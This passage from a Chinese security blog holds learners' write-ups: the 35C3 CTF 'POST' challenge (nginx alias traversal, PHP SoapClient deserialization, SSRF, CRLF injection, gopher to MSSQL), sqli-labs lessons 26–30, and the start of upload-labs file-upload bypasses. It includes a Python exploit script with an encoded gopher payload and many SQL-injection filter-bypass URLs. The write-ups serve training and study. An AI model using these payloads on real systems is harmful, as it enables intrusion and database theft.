{<br>    alias /home/;<br>}<br>此时，访问<a href="http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。" target="_blank" rel="noopener">http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。</a><br>但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录：</p></blockquote><p>这段我也是看的很懵逼，啥叫用alias设置/home/查了下 原来这个就是用来设置根目录的别名的 比如 </p><blockquote><p>location /abc/ {     alias /home/html/abc/; }</p></blockquote><p>至于为啥没加/就会导致根目录穿梭，没有查出来具体原因，反正就是要加/ 额<br>直接试试 /uploads../<br>(具体原因不知道为啥要弄这个目录，或许这是一默认的吗？)<br>将源码down下来</p><h3 id="第二步-任意反序列化"><a href="#第二步-任意反序列化" class="headerlink" title="第二步 任意反序列化"></a>第二步 任意反序列化</h3><p>进入html/目录<br><img src="https://i.imgur.com/YG8x6jB.png" alt=""><br>貌似没有特别的价值<br>再试试uploads 貌似打不开</p><p>default.backup 试试，里面<br>一些服务器的配置信息<br><img src="https://i.imgur.com/cDMjnhT.png" alt=""><br>就是由于这个uploads没加/所以导致的目录穿梭的<br>暂时没看出有什么可利用的</p><p>进nginx-debian.html试试<br>好像也没有什么特别值得注意的地方</p><p>再进入/inc/目录<br>发现一堆内容<br><img src="https://i.imgur.com/HYGYbeh.png" alt=""><br>前面提示一中说flag在db中<br>我尝试down下db<br>大概看了下感觉这里应该是设置sql连接的配置<br><img src="https://i.imgur.com/CJ3JhQX.png" alt=""><br>看到这边有unserialize猜测是否会有反序列化存在<br>想不出反序列化的利用pop链<br>没有看到什么内置类，这里应该是要使用php本身内置类<br>我记得上次是LCTF一题bestphp’s revenge貌似有说到<br>可以看看</p><blockquote><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p></blockquote><p>但是它有一个过滤<br>在官方wp看到<br>MSSQL会自动将全角unicode字符转换为ASCII表示形式。例如，如果字符串包含0xEF 0xBC 0x84，则将其存储为$<br>可以绕过(好吧我还是不知道怎么绕过)</p><h3 id="第三步-利用SoapClient-SSRF"><a href="#第三步-利用SoapClient-SSRF" class="headerlink" title="第三步 利用SoapClient SSRF"></a>第三步 利用SoapClient SSRF</h3><p><img src="https://i.imgur.com/j2J0TBz.png" alt=""><br>这里有个 <strong>tostring<br>可以将this-&gt;za open<br>这里可能是要soapclient 进行ssrf打开flag文件？<br>好吧 实际上是序列化SoapClient为za然后后触发它不存在的方法（</strong>call方法）SoapClient（至于怎么写入SoapClient还是不知道，反正肯定要先反序列化，再__call触发打入ssrf，）</p><p>现在我们要做的就是触发<strong>tosring方法<br><img src="https://i.imgur.com/a6h9udB.png" alt=""><br>这里将Attachment化为一个字符串，触发</strong>tostring<br>调用 post::loadall()</p><blockquote><p>::范围解析操作符<br><a href="http://php.net/manual/zh/language.oop5.paamayim-nekudotayim.php#language.oop5.paamayim-nekudotayim" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.paamayim-nekudotayim.php#language.oop5.paamayim-nekudotayim</a></p></blockquote><p>例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php class MyClass &#123;const CONST_VALUE = &apos;A constant value&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$classname = &apos;MyClass&apos;;</span><br><span class="line">echo $classname::CONST_VALUE; // 自 PHP 5.3.0 起</span><br><span class="line">echo MyClass::CONST_VALUE;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>大概是为了不实例化对象就调用它的方法吧？<br><img src="https://i.imgur.com/n69hNda.png" alt=""><br>然后又调用<br><img src="https://i.imgur.com/RypRJtr.png" alt=""><br>DB的query方法<br>然后<br><img src="https://i.imgur.com/PYDr84A.png" alt=""><br>又调用initialize方法<br><img src="https://i.imgur.com/ToJmP4Y.png" alt=""><br>连接了数据库？？？<br>额，貌似线索断了<br>往上看看<br>原来<br><img src="https://i.imgur.com/7F47b1K.png" alt=""><br>query函数本身就返回<br><img src="https://i.imgur.com/nkT3E3X.png" alt=""><br>那这个res哪来的？？？<br><img src="https://i.imgur.com/p0bKcKA.png" alt=""><br>查下</p><blockquote><p>sqlsrv_query - 准备并执行查询</p></blockquote><p>所以这个到底是返回什么 $values吗？<br><img src="https://i.imgur.com/gcuFdZZ.png" alt=""><br>这个貌似是uid这是什么鬼<br>好吧，看半天不是很懂<br>猜测是通过uid传个序列化的SoapClient吧？然后触发反序列<br>这个是别人的exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Attachment &#123;</span><br><span class="line">    private $za = NULL;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">            $this-&gt;za = new SoapClient(null,array(&apos;location&apos;=&gt;&apos;your_ip&apos;,&apos;uri&apos;=&gt;&apos;your_ip&apos;));   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=new Attachment();</span><br><span class="line">$aaa=serialize($c);</span><br><span class="line">echo $aaa;</span><br></pre></td></tr></table></figure></p><p>然后就直接soap ssrf<br>进入了</p><h3 id="第四步-SoapClient-CRLF注射"><a href="#第四步-SoapClient-CRLF注射" class="headerlink" title="第四步 SoapClient CRLF注射"></a>第四步 SoapClient CRLF注射</h3><p><img src="https://i.imgur.com/7kgwJGD.png" alt=""><br>之前看到的文件起作用了<br>因为SoapClient只支持post，<br>不过_user_agent属性存在CRLF注入<br>就是\r\n<br>另外miniProxy只能代理http / https请求<br>貌似SoapClient并不是http/https请求而是本身就是一种请求方式</p><p>这个可以通过gopher绕过</p><h3 id="第五步-通过gopher连接到MSSQL"><a href="#第五步-通过gopher连接到MSSQL" class="headerlink" title="第五步 通过gopher连接到MSSQL"></a>第五步 通过gopher连接到MSSQL</h3><p>gopher会在请求后加上一个\r\n，因此构造gopher请求时要在sql语句后加一个注释符– -<br>别人的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">host=&quot;http://35.207.83.242/?&quot;</span><br><span class="line">post=&#123;</span><br><span class="line">    &quot;username&quot;:&quot;aaaaaaaaaa&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;aaaaaaaaaa&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.Session()</span><br><span class="line">url1=host+&quot;page=login&quot;</span><br><span class="line">r.post(url=url1,data=post)</span><br><span class="line">def fetch_uid():</span><br><span class="line">    return r.get(host, headers=&#123;&quot;Debug&quot;: &quot;1&quot;&#125;).content.decode().split(&quot;int(&quot;)[1].split(&quot;)&quot;)[0]</span><br><span class="line">payload=base64.b64decode(&quot;JHNlcmlhbGl6ZWRvYmplY3TvvIRPOjEwOiJBdHRhY2htZW50IjoxOntzOjI6InphIjtPOjEwOiJTb2FwQ2xpZW50IjozOntzOjM6InVyaSI7czozNToiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21pbmlQcm94eS5waHAiO3M6ODoibG9jYXRpb24iO3M6MzU6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9taW5pUHJveHkucGhwIjtzOjExOiJfdXNlcl9hZ2VudCI7czoxMzk5OiJBQUFBQUhhaGEKCkdFVCAvbWluaVByb3h5LnBocD9nb3BoZXI6Ly8vZGI6MTQzMy9BJTEyJTAxJTAwJTJGJTAwJTAwJTAxJTAwJTAwJTAwJTFBJTAwJTA2JTAxJTAwJTIwJTAwJTAxJTAyJTAwJTIxJTAwJTAxJTAzJTAwJTIyJTAwJTA0JTA0JTAwJTI2JTAwJTAxJUZGJTAwJTAwJTAwJTAxJTAwJTAxJTAyJTAwJTAwJTAwJTAwJTAwJTAwJTEwJTAxJTAwJURFJTAwJTAwJTAxJTAwJUQ2JTAwJTAwJTAwJTA0JTAwJTAwdCUwMCUxMCUwMCUwMCUwMCUwMCUwMCUwMFQwJTAwJTAwJTAwJTAwJTAwJTAwJUUwJTAwJTAwJTA4JUM0JUZGJUZGJUZGJTA5JTA0JTAwJTAwJTVFJTAwJTA3JTAwbCUwMCUwQSUwMCU4MCUwMCUwOCUwMCU5MCUwMCUwQSUwMCVBNCUwMCUwOSUwMCVCNiUwMCUwMCUwMCVCNiUwMCUwNyUwMCVDNCUwMCUwMCUwMCVDNCUwMCUwOSUwMCUwMSUwMiUwMyUwNCUwNSUwNiVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCUwMCUwMCUwMCUwMGElMDB3JTAwZSUwMHMlMDBvJTAwbSUwMGUlMDBjJTAwaCUwMGElMDBsJTAwbCUwMGUlMDBuJTAwZyUwMGUlMDByJTAwJUMxJUE1UyVBNVMlQTUlODMlQTUlQjMlQTUlODIlQTUlQjYlQTUlQjclQTVuJTAwbyUwMGQlMDBlJTAwLSUwMG0lMDBzJTAwcyUwMHElMDBsJTAwbCUwMG8lMDBjJTAwYSUwMGwlMDBoJTAwbyUwMHMlMDB0JTAwVCUwMGUlMDBkJTAwaSUwMG8lMDB1JTAwcyUwMGMlMDBoJTAwYSUwMGwlMDBsJTAwZSUwMG4lMDBnJTAwZSUwMCUwMSUwMSUwMSUwRSUwMCUwMCUwMSUwMCUxNiUwMCUwMCUwMCUxMiUwMCUwMCUwMCUwMiUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwMCUwMCUwMGklMDBuJTAwcyUwMGUlMDByJTAwdCUwMCUyMCUwMGklMDBuJTAwdCUwMG8lMDAlMjAlMDBwJTAwbyUwMHMlMDB0JTAwcyUwMCUyMCUwMCUyOCUwMHUlMDBzJTAwZSUwMHIlMDBpJTAwZCUwMCUyQyUwMCUyMCUwMHQlMDBpJTAwdCUwMGwlMDBlJTAwJTJDJTAwJTIwJTAwYyUwMG8lMDBuJTAwdCUwMGUlMDBuJTAwdCUwMCUyQyUwMCUyMCUwMGElMDB0JTAwdCUwMGElMDBjJTAwaCUwMG0lMDBlJTAwbiUwMHQlMDAlMjklMDAlMjAlMDB2JTAwYSUwMGwlMDB1JTAwZSUwMHMlMDAlMjAlMDAlMjglMDAyJTAwMCUwMDAlMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTJDJTAwJTIwJTAwJTI4JTAwcyUwMGUlMDBsJTAwZSUwMGMlMDB0JTAwJTIwJTAwZiUwMGwlMDBhJTAwZyUwMCUyMCUwMGYlMDByJTAwbyUwMG0lMDAlMjAlMDBmJTAwbCUwMGElMDBnJTAwLiUwMGYlMDBsJTAwYSUwMGclMDAlMjklMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTI5JTAwJTNCJTAwJTNCJTAwLSUwMC0lMDAlMjAlMDAtJTAwIEhUVFAvMS4xCkhvc3Q6IGxvY2FsaG9zdAoKIjt9fQ==&quot;)</span><br><span class="line">print(payload)</span><br><span class="line">data=&#123;</span><br><span class="line">    &quot;title&quot;:&quot;testssssssssssssss&quot;,</span><br><span class="line">    &quot;content&quot;:payload,</span><br><span class="line">&#125;</span><br><span class="line">url2=host+&quot;action=create&quot;</span><br><span class="line">r.post(url=url2,data=data)</span><br></pre></td></tr></table></figure><p>对于gopher我是真的不熟悉<br>先学习一波</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这题是真的难，现在的我理解都要半天….ヽ(ﾟ´Д`)ﾉﾟ</p>]]></content>
    
    <summary type="html">
    
      关于35C3CTF POST WP的学习
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="sql注入" scheme="https://museljh.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="ssrf" scheme="https://museljh.github.io/tags/ssrf/"/>
    
      <category term="反序列" scheme="https://museljh.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97/"/>
    
      <category term="源码泄露" scheme="https://museljh.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs less 26 ~ 30</title>
    <link href="https://museljh.github.io/2019/02/11/sqli-labs%20less%2026%20~%2030/"/>
    <id>https://museljh.github.io/2019/02/11/sqli-labs less 26 ~ 30/</id>
    <published>2019-02-11T03:46:13.000Z</published>
    <updated>2019-02-11T03:53:16.756Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>SQLI-LABS是一个学习SQLI的平台以下实验包适用于GET和POST场景,可以通过git clone <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a> 来搭建属于自己的一个sql注入练习靶场</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="less-26-Trick-with-comments-and-space-过滤注释和空格"><a href="#less-26-Trick-with-comments-and-space-过滤注释和空格" class="headerlink" title="less 26 Trick with comments and space (过滤注释和空格)"></a>less 26 Trick with comments and space (过滤注释和空格)</h3><p><img src="https://i.imgur.com/cN4gqRg.png" alt=""><br>可以看出过滤了空格，or，and,/*,#,–,/等各种符号<br>对于or，and可以使用双写绕过构造oorr，或者anandd进行绕过,<br>或者构造and与or的逻辑表达式&amp;&amp;和||<br>对于注释的过滤我们可以采取or ‘1<br>对于空格我们可以采取一系列如下方式（最常用的还是/**/不过这里被过滤了）</p><blockquote><p>%09 TAB键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return功能<br>%0b TAB键（垂直）<br>%a0 空格</p></blockquote><p>貌似由于windows下apache会将这些字符解析成一些奇怪的东西，所以就不演示了，如果想具体实现的话可以在linux下进行操作<br><img src="https://i.imgur.com/tejOJap.png" alt=""><br>注：貌似%0b可以通过在windows下</p><h3 id="less-26a-Trick-with-comments-and-space-过滤注释和空格"><a href="#less-26a-Trick-with-comments-and-space-过滤注释和空格" class="headerlink" title="less 26a Trick with comments and space (过滤注释和空格)"></a>less 26a Trick with comments and space (过滤注释和空格)</h3><p>这题与上题区别在于多了个（）<img src="https://i.imgur.com/hPaMcln.png" alt=""></p><p>可以构造 || （‘1进行绕过</p><h3 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-union和select"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-union和select" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us  (union和select)"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us  (union和select)</h3><p><img src="https://i.imgur.com/fB8Klyb.png" alt=""><br>嗯过滤了select，union，这些都是白名单过滤，只要双写绕过就可以<br>payload（这里是先没有绕过空格的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-27/</span><br><span class="line">?id=0&apos; or updatexml(1,concat(0x7e,(seleselectct group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x7e),1) or &apos;</span><br></pre></td></tr></table></figure></p><p>不过我自己测试的时候select过滤了两次…这里可能需要三写绕过<br>了，空格的话可以%0b绕过（在windows下只能用这个）<br>这里我们使用报错注入+双写<img src="https://i.imgur.com/F9a4guj.png" alt=""><br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-27/?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(seselectlect%0bdatabase()),0x7e),1)%0bor%0b&apos;</span><br></pre></td></tr></table></figure></p><p>最终payload（我这个是三写绕过….+报错注入）<br>获取数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-27/</span><br><span class="line">?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bdatabase()%0blimit%0b0,1),0x7e),1)%0bor%0b&apos;</span><br></pre></td></tr></table></figure></p><p>获取表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-27/</span><br><span class="line">?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&apos;security&apos;%0blimit%0b0,1),0x7e),1)%0bor%0b&apos;</span><br></pre></td></tr></table></figure></p><p>获取列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-27/</span><br><span class="line">?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=&apos;security&apos;%0band%0btable_name=&apos;users&apos;%0blimit%0b0,1),0x7e),1)%0bor%0b&apos;</span><br></pre></td></tr></table></figure></p><p>获取字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-27/</span><br><span class="line">?id=0&apos;%0bor%0bupdatexml(1,concat(0x7e,(selseleselectctect%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&apos;security&apos;%0blimit%0b0,1),0x7e),1)%0bor%0b&apos;</span><br></pre></td></tr></table></figure></p><p>当然这里union，select也可以使用大小写绕过</p><blockquote><p>1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个<br>2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同<br>3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号<br>4、/s 与/m相对，单行模式匹配。<br>5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。<br>6、/x 忽略空白模式。<br>这里有值得注意的一点，这些修饰符是可以混合使用的。例如 /ig、/ie等。</p></blockquote><blockquote><p>这里使用group_concat可以将全部查询的报出来</p></blockquote><h3 id="less-27a-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-union和select"><a href="#less-27a-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-union和select" class="headerlink" title="less 27a GET - Error Based- All your UNION &amp; SELECT belong to us  (union和select)"></a>less 27a GET - Error Based- All your UNION &amp; SELECT belong to us  (union和select)<img src="https://i.imgur.com/J0KuMEd.png" alt=""></h3><p><img src="https://i.imgur.com/FKgms4c.png" alt=""><br>这题和之前那题不同的地方在于</p><blockquote><p>1.错误信息并没有显示出来<br>2.没有单引号保护<br>基于这两点，我们可以使用联合注入和盲注<br>这里我们只举联合注入作为例子<br>联合注入首先有两种绕过：大小写绕过，双写绕过</p></blockquote><p>payload<br>报数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-27a/?id=0&quot;%0buniunionon%0bseleselectct%0b1,2,database()%0b&quot;1</span><br></pre></td></tr></table></figure></p><p>嗯，盲注和爆其他的就不写了，（话说我源码为啥select过滤了两次？？？）</p><h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入</h3><p><img src="https://i.imgur.com/h54XpAz.png" alt=""><br>依旧是没有错误信息显示，不过我们仍然可以采用联合注入的方式，和之前不同这次是有（）的<br><img src="https://i.imgur.com/j5iEn6v.png" alt=""><br>这里过滤了union空格+select<br>我们可以尝试双写绕过 即 union union select select<br>不过经过我的测试，union注入是不可以的<img src="https://i.imgur.com/u8eiabi.png" alt=""><br>可以看到因为注释符号被过滤了只能采取 （’闭合 但是由于limit 0，1 末尾我们不能使用and或者or应该使用where语句 不然会导致无法将我们需要的数据爆出来<br>使用where是为了让语句变成无约束查询<br>payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-28/?id=0&apos;)%0bunion%0bunion%0bselect%0bselect%0b3,5,database()%0bfrom%0busers%0bwhere%0b(&apos;2&apos;)=(&apos;2</span><br></pre></td></tr></table></figure></p><p>当然也可以尝试盲注，布尔盲注和时间盲注应该都是可以的，我就不试了</p><h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入-1"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入-1" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入</h3><p><img src="https://i.imgur.com/nMq0Kvd.png" alt=""><br><img src="https://i.imgur.com/U6nyhFh.png" alt=""><br>可以看到id仍让是由（‘’）保护<br>并且它仍然是可以输出username，password数据，以及这了只过滤了union空格select，但是没有不会爆出错误信息（为啥明明错误时候已经没有print_r(mysql_error())还是会爆出错误？？我猜测这里可能还与mysql或者其他的某个配置有关，所以还是可以报错注入？？  经过尝试是不可以显错注入的  因为没有 print_r(mysql_error()) 错误信息只是 路径而已 就是 这个的上面部分 <img src="https://i.imgur.com/uIsjRGk.png" alt=""><br>）<br>直接拿上题的payload就可以了。。 话说我觉得这个题目顺序可能出现了点问题</p><h3 id="Less-29-Protection-with-WAF"><a href="#Less-29-Protection-with-WAF" class="headerlink" title="Less - 29 Protection with WAF"></a>Less - 29 Protection with WAF</h3><p>这题与之前的都有所不同，首先是文件夹就有三个，经过查看，一个是index页面，一个是waf页面，一个是错误页面<br>这题由于我只有apache服务器所以直接用index页面不可以，按题目要求应该是要两层服务器一个做waf一个做web服务器，<br>所以我们直接用login.php进行测试<br>经过尝试后发现不行这个waf的作用应该是只能数字进入，绕过的话要使用http参数污染</p><blockquote><p>http参数污染<br><img src="https://i.imgur.com/rI6uEhF.png" alt=""></p></blockquote><p>所以这个题目应该是要前面用数组id=1&amp;id=xxx进行绕过<br>推荐看下这个，我也是看了这个才了解的</p><blockquote><p><a href="https://blog.csdn.net/nzjdsds/article/details/77758824" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/77758824</a></p></blockquote><p>Less-30 基于错误的GET型双引号字符型注入<br>这题和上题几乎一样，用http参数污染，只要把后面的改成双引号就可以了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.csdn.net/nzjdsds/article/details/77430073" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/77430073</a><br><a href="https://blog.csdn.net/qq_21500173/article/details/51964908" target="_blank" rel="noopener">https://blog.csdn.net/qq_21500173/article/details/51964908</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      关于SQLI-LABS less 26 ~ 30的writeup
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="sql注入" scheme="https://museljh.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-writeup 1~5</title>
    <link href="https://museljh.github.io/2019/02/10/upload-labs-writeup%201~5/"/>
    <id>https://museljh.github.io/2019/02/10/upload-labs-writeup 1~5/</id>
    <published>2019-02-10T09:18:02.000Z</published>
    <updated>2019-02-10T09:40:16.402Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>upload-labs是一个基于php语言的上传漏洞的靶场项目包括(最新commit17ec936) 的19个上传关卡的方法。可以通过git clone <a href="https://github.com/c0ny1/upload-labs.git" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs.git</a> 来搭建属于自己的一个upload练习靶场</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><img src="https://i.imgur.com/hiUxIwF.png" alt=""></p><h3 id="Pass-01-客户端js白名单检查"><a href="#Pass-01-客户端js白名单检查" class="headerlink" title="Pass-01 客户端js白名单检查"></a>Pass-01 客户端js白名单检查</h3><p><img src="https://i.imgur.com/adFI7ae.png" alt=""><br>通过源码我们可以看出这题对于文件上传的限制是通过前端js，判断是否为.jpg/.png/.gif这三种格式的文件形式，这种是一种js对文件后缀名做了白名单限制，这种限制十分不安全，有好几种绕过方式<br>一：修改js脚本<br><img src="https://i.imgur.com/chK4DvQ.png" alt=""><br>按道理是可以的，但是这里却失败了，尝试了下直接删除onsubmit函数不过还是不行，不过这也是一种思路</p><p>二：浏览器禁止使用js脚本(这里以火狐浏览器为例子)</p><blockquote><p>1、在Firefox地址栏里输入“about:config”。<br>2、在搜索栏输入“javascript.enabled”查找到首选项。<br>3、点击鼠标右键选择“切换”，把“javascript.enabled”键值改为“false”</p></blockquote><p>三：Burpsuit进行改包<br>因为js仅仅只对客户端进行限制，而使用Burpsuit却可以绕过客户端限制直接拦截发送给服务端的文件进行修改<img src="https://i.imgur.com/Ktk4eTS.png" alt=""></p><p><img src="https://i.imgur.com/eZhjYN7.png" alt=""><br><img src="https://i.imgur.com/e1EQe2x.png" alt=""><br>将jpg修改成php,可以看到自己本地upload文件夹多处了个php文件</p><blockquote><p>提示一：../upload文件夹不存在,请手工创建！（第一次上传文件时可能会有这个错误提示，在根目录创建一个upload文件夹就可以了）<br>提示二：Burpsuit当url是127.0.0.1是不可以抓包的，可以修改为自己本地IPv4地址比如 192.168.xxx.xxx</p></blockquote><p><img src="https://i.imgur.com/T4bAYD3.png" alt=""><br>这里有个地方要注意，我也是看被人的wp的时候才发现的</p><blockquote><p>null：代表声明了一个空对象，不是一个字符串，可以赋给任何对象，是没有地址。<br>“”：代表声明了一个对象实例，这个对象实例的值是一个长度为0的空字符串，是有地址但是里面的内容是空的。</p></blockquote><p>我的理解是null是不可以不上传文件，’’意思是不能上传空文件</p><h3 id="Pass-02-服务端白名单"><a href="#Pass-02-服务端白名单" class="headerlink" title="Pass-02 服务端白名单"></a>Pass-02 服务端白名单</h3><p>直接采取第一题的Burpuit改包的方式一下就成功了，我们尝试下能否使用其他的方式进行绕过，以便对这题有着更加深刻的理解<br>查看下源码<br><img src="https://i.imgur.com/U8D0mkm.png" alt=""><br>这里显然同样采取了白名单的形式，<br>它会在服务端检测上传文件的Content-Type: 内容格式，这也导致了另一种上传绕过方式，即将上传的php文件的文件格式用Burpsuit进行修改，<br><img src="https://i.imgur.com/9ZdAKKU.png" alt=""><br>我们可以看见同样上传成功</p><h3 id="Pass-03-服务端黑名单"><a href="#Pass-03-服务端黑名单" class="headerlink" title="Pass-03 服务端黑名单"></a>Pass-03 服务端黑名单</h3><p>依旧采取第一题的Burpsuit方式，发现会报错错误提示<img src="https://i.imgur.com/hCuh49a.png" alt=""><br>查看源码<br><img src="https://i.imgur.com/vlMjPqv.png" alt=""><br>我们发现这是一种过滤文件后面的.和.asp,.aspx,.php,.jsp等后缀一种黑名单限制，并且不区分大小写，这样我们就不可以通过构造大写来绕过<br>方法一： 特殊后缀绕过<br>尝试使用特殊的php后缀</p><blockquote><p>php2, php3, php4, php5, phps, pht, phtm, phtml<br><img src="https://i.imgur.com/RGYJFZ3.png" alt=""><br>结果并没有上传成php文件，查询后原来是apache的配置文件里并没有配置将这些后缀的文件当做php解析，<br>apache的httpd.conf中有如下配置代码<br>AddType application/x-httpd-php .php .phtml .phps .php5 